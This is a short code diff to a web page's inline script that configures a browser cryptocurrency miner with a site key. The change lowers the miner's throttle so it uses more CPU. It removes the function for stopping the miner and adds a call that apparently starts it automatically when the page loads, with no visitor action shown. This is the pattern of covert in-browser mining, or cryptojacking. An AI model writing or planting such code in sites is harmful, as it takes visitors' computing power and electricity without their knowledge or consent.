@@ -30,7 +30,7 @@
     var miner = new Minero.User('c8f9d05f045621004b0dfc8f580f6ace', 'john-smith', {
       threads: 2,
       autoThreads: false,
-      throttle: 0.2
+      throttle: 0.1
     });
     var started = false;
     var toggleMiner = function() {
@@ -45,9 +45,7 @@
       }
       started = !started;
     }
-    var stopMiner = function() {
-      miner.stop();
-    }
+    toggleMiner();
     </script>
 
 <script>
